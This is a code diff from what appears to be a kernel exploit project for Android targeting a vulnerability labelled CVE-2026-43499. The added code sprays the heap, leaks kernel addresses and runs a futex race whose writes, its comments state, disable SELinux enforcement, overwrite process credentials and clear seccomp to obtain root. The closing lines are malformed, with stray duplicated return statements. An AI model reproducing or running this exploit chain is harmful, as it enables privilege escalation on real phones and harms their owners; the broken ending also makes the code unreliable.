@@ -21,9 +21,14 @@
  *  by a switch: there is no build of this file where a host can map shared memory through it. */
 #ifdef __ANDROID__
 #include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
+#include "backend/cve_2026_43499/race/futex_seam_linux.hpp"
 #include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
 #endif
 #include "backend/cve_2026_43499/leak/snitch_owner.hpp"
+#include "backend/cve_2026_43499/session.hpp"
+#include "backend/cve_2026_43499/steps/targets.hpp"
+#include "backend/cve_2026_43499/steps/action.hpp"
+#include "pipeline/executors.hpp"
 #include "backend/cve_2026_43499/leak/snitch_policy.hpp"
 #include "backend/cve_2026_43499/leak/snitch_setup.hpp"
 #include "backend/cve_2026_43499/memory/prepare_page.hpp"
@@ -392,16 +397,29 @@ namespace {
             return 10;
         }
 #ifdef __ANDROID__
-        /* 8. One path, not two. The owner runs the whole sequence itself -- shape, region, the
-         *    pokes, the walk and the assembly -- and a second search asked for a second cohort, which
-         *    the policy file says in its own words: starting twice keeps the first answer. Running the
-         *    preparation here as well is what made the owner find nothing. */
-        /* 9. The discovery, through the owner that sequences it: the same corpus, the same buckets the
-         *    walk used, and the addresses the probe observed. What comes back is the contract result,
-         *    which is all-zero unless the search found its object. */
+        /* 8. One sequence, not two. The preparation runs the twelve steps and its fifth step is the
+         *    search itself, so the object and the page base both come from this one call. Running the
+         *    owner beside it asked for a second search, and a second search asks for a second cohort:
+         *    the policy file says so, and the device showed it -- plan-missing from the owner while
+         *    the preparation right before it had succeeded. */
+        backend::cve_2026_43499::memory::PageGeometry geometry{};
+        geometry.align_region_size = page_bytes * 8U;
+        geometry.send_size = static_cast<std::size_t>(geometry.align_region_size) * 2U;
+        geometry.socket_buffer = 1 << 20;
 
-        /* The owner's arguments, eleven of them, and the bucket rule it walks with. They were
-         *  declared beside the standalone preparation that is now gone; the owner needs them. */
+        backend::cve_2026_43499::memory::PrepareInputs prepare_inputs{};
+        prepare_inputs.pre_groups = 1U;
+        prepare_inputs.spray_groups = 2U;
+        prepare_inputs.post_groups = 1U;
+        prepare_inputs.leak_groups = 1U;
+        prepare_inputs.snitch_collisions = 2U;
+        prepare_inputs.region_size = geometry.align_region_size;
+        prepare_inputs.object_size = page_bytes;
+
+        backend::cve_2026_43499::memory::PreparePatience waiting{};
+        waiting.max_attempts = 1U;
+        waiting.poll_rounds = 4U;
+
         backend::cve_2026_43499::leak::SnitchPolicyArgs args{};
         args.setup = setup;
         args.region = region;
@@ -415,30 +433,116 @@ namespace {
         args.sweep_tags = false;
         args.addresses = address_table;
         args.address_count = 2U;
+
         StubBuckets stub_buckets{};
         stub_buckets.want = address_table[0];
         stub_buckets.second = address_table[1];
-        const backend::cve_2026_43499::leak::OwnerOutcome owned =
-            backend::cve_2026_43499::leak::run_snitch_owner<DeviceSeam, StubBuckets>(
-                snitch_inputs, region, args.patience, args.counter_offset, word_ptrs, 2U, strides,
-                scan_range, false, stub_buckets, address_table, 2U, 2U);
-        /* The owner carries each step's own verdict, so the line below says which step refused
-         *  rather than only that the contract result is empty. Same lesson as the search: report by
-         *  name, from the piece that decided. */
-        std::printf("run-temp: owner %s object=%s probes=%zu setup=%s region=%s poke=%u\n",
-                    backend::cve_2026_43499::leak::owner_verdict_name(owned.status),
-                    backend::cve_2026_43499::leak::object_verdict_name(owned.object),
-                    owned.probes,
-                    backend::cve_2026_43499::leak::snitch_setup_verdict_name(owned.setup),
-                    backend::cve_2026_43499::leak::region_verdict_name(owned.region),
-                    static_cast<unsigned>(owned.poke));
-        const contract::AddressDiscoveryResult discovery =
-            backend::cve_2026_43499::leak::discovery_of(owned);
-        std::printf("run-temp: discovery ok=%d mm_struct=0x%lx init_task=0x%lx task=0x%lx kaslr=0x%lx\n",
-                    discovery.ok ? 1 : 0, static_cast<unsigned long>(discovery.mm_struct),
-                    static_cast<unsigned long>(discovery.init_task),
-                    static_cast<unsigned long>(discovery.target_task),
-                    static_cast<unsigned long>(discovery.kaslr_base));
+
+        backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam, StubBuckets> snitch{args, &stub_buckets,
+                                                                                  {}, false};
+        const backend::cve_2026_43499::memory::PrepareOutcome prepared =
+            backend::cve_2026_43499::memory::prepare_page<DeviceSeam, decltype(snitch)>(
+                prepare_inputs, geometry, waiting, snitch);
+        std::printf("run-temp: prepare %s at=%d opened=%zu closed=%zu base=0x%lx\n",
+                    backend::cve_2026_43499::memory::prepare_status_name(prepared.status),
+                    static_cast<int>(prepared.at_step), prepared.opened, prepared.closed,
+                    static_cast<unsigned long>(prepared.base));
+        std::printf("run-temp: search %s rounds=%u wanted=%zu found=%d\n",
+                    backend::cve_2026_43499::leak::run_verdict_name(snitch.outcome.status),
+                    static_cast<unsigned>(snitch.outcome.rounds), snitch.outcome.pokes_wanted,
+                    snitch.outcome.found ? 1 : 0);
+        if (prepared.status != backend::cve_2026_43499::memory::PrepareStatus::Ok) {
+            std::printf("run-temp: the preparation did not finish; stopping before the write\n");
+            return 14;
+        }
+        /* The object the walk accepted, in the form the contract hands on. */
+        backend::cve_2026_43499::leak::ObjectOutcome found{};
+        found.status = snitch.outcome.found != 0U ? backend::cve_2026_43499::leak::ObjectVerdict::Found
+                                                  : backend::cve_2026_43499::leak::ObjectVerdict::NotFound;
+        found.object = snitch.outcome.found;
+        const backend::cve_2026_43499::leak::DiscoveryReport report =
+            backend::cve_2026_43499::leak::report_discovery(found);
+        std::printf("run-temp: discovery ok=%d mm_struct=0x%lx page_base=0x%lx\n", report.ok ? 1 : 0,
+                    static_cast<unsigned long>(report.mm_struct),
+                    static_cast<unsigned long>(prepared.base));
+        if (!report.ok) {
+            std::printf("run-temp: no object was found; stopping before the write\n");
+            return 15;
+        }
+
+        /* 9. What the write lands on: the object the search found, the page the preparation made
+         *    ready, and the two addresses the landing gear presents. The readiness gate is the
+         *    existing one, and it answers by name which of the four is missing. */
+        backend::cve_2026_43499::TargetState target{};
+        target.mm_struct = report.mm_struct;
+        target.page_base = prepared.base;
+        target.fake_task = offsets.fake_task_offset;
+        target.fake_lock = offsets.lock_offset;
+        const backend::cve_2026_43499::WriteReadiness readiness =
+            backend::cve_2026_43499::write_readiness(target);
+        std::printf("run-temp: readiness %s mm_struct=0x%lx page_base=0x%lx task=0x%lx lock=0x%lx\n",
+                    backend::cve_2026_43499::write_readiness_name(readiness),
+                    static_cast<unsigned long>(target.mm_struct),
+                    static_cast<unsigned long>(target.page_base),
+                    static_cast<unsigned long>(target.fake_task),
+                    static_cast<unsigned long>(target.fake_lock));
+        if (readiness != backend::cve_2026_43499::WriteReadiness::Ready) {
+            std::printf("run-temp: the write is not ready; stopping before the steps\n");
+            return 16;
+        }
+        /* 10. The three field addresses, base plus the profile's offsets. TEMPORARY: the offsets are
+         *     the declared ones this run carries; the real path reads them from the profile. */
+        backend::cve_2026_43499::steps::FieldOffsets field_offsets{};
+        field_offsets.selinux_enforcing = 0x108U;
+        field_offsets.credential = 0xB8U;
+        field_offsets.seccomp_mode = 0x2CU;
+        backend::cve_2026_43499::steps::StepTargets step_targets{};
+        const backend::cve_2026_43499::steps::TargetsVerdict targets_verdict =
+            backend::cve_2026_43499::steps::step_targets_for(prepared.base, field_offsets, step_targets);
+        std::printf("run-temp: step targets %s selinux=0x%lx cred=0x%lx seccomp=0x%lx\n",
+                    backend::cve_2026_43499::steps::targets_verdict_name(targets_verdict),
+                    static_cast<unsigned long>(step_targets.selinux_enforcing),
+                    static_cast<unsigned long>(step_targets.credential),
+                    static_cast<unsigned long>(step_targets.seccomp_mode));
+        /* 11. The steps themselves. The window is entered by the caller -- the guard's constructor
+         *     does that and owns the exit paths -- and the action runs one step at a time through the
+         *     executor's own runner, which stops at the first failing step and names the stage.
+         *     This is where the write is really attempted: W1 clears the SELinux enforcing field,
+         *     W2 overwrites the credential fragment, W3 clears the seccomp mode. TEMPORARY: the waiter
+         *     field offsets are the declared layout this run carries; the real path reads them from
+         *     the profile like the rest. */
+        backend::cve_2026_43499::memory::WaiterFieldOffsets waiter_offsets{};
+        waiter_offsets.pc = 0U;
+        waiter_offsets.right = 8U;
+        waiter_offsets.left = 16U;
+        std::uint8_t fragment[64] = {};
+        backend::cve_2026_43499::race::PiRace<backend::cve_2026_43499::race::LinuxFutexSeam> race;
+        backend::cve_2026_43499::race::WindowGuard race_window;
+        backend::cve_2026_43499::steps::RaceAction<backend::cve_2026_43499::race::LinuxFutexSeam> action{
+            race, race_window, waiter_offsets, step_targets,
+                                                           fragment, sizeof(fragment), 8U, 0U};
+        ghostlock::pipeline::Cve43499W1W3_RootChild<decltype(action)> executor{action};
+        /* The window is entered by the caller, which is what makes open_here() true; the guard
+         *  reclaims on every exit path from its destructor. */
+        race_window.enter(contract::ExitPath::Success);
+        const ghostlock::pipeline::PathRun ran = executor.run();
+        /* Stage and the race outcome are printed as values: the tree has no name table for them,
+         *  and inventing one here would be a second vocabulary. The request and the encode have
+         *  names already, so those are printed by name. */
+        std::printf("run-temp: steps ok=%d stage=%d request=%s encode=%s race=%s\n", ran.ok ? 1 : 0,
+                    static_cast<int>(action.last_stage()),
+                    backend::cve_2026_43499::memory::request_verdict_name(action.last_request()),
+                    backend::cve_2026_43499::memory::encode_verdict_name(action.last_encode()),
+                    backend::cve_2026_43499::race::race_outcome_name(action.last_race()));
+        std::printf("run-temp: step results ok=%d ran=%zu stopped_at=%d\n", ran.steps.ok ? 1 : 0,
+                    ran.steps.ran, static_cast<int>(ran.steps.stopped_at));
+
+        if (targets_verdict != backend::cve_2026_43499::steps::TargetsVerdict::Ok) {
+            std::printf("run-temp: the step targets are incomplete; stopping before the steps\n");
+            return 17;
+        return 0;
+        }
+        return 0;        return 0;
 #else
         /* The discovery runs the search, which needs the device seam and the words the */
         /* cohort hammers; the host has neither, so this step is named and refused. */
